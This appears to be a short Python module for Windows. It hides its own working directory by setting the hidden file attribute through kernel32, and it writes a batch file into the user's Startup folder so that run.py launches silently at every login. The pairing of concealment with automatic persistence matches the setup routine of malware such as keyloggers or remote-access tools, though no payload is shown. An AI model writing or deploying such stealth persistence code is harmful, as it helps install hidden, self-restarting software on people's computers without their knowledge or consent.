import ctypes
import getpass
import os

USER_NAME = getpass.getuser()
current_dir = os.getcwd()

def change():
    kernel32 = ctypes.windll.kernel32
    attr = kernel32.GetFileAttributesW(current_dir)
    kernel32.SetFileAttributesW(current_dir, attr | 2)

def add_to_startup(file_path=os.path.join(current_dir, "run.py")):
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    bat_file_path = os.path.join(bat_path, "open.bat")
    with open(bat_file_path, "w") as bat_file:
        bat_file.write(r'start "" python "%s"' % file_path)
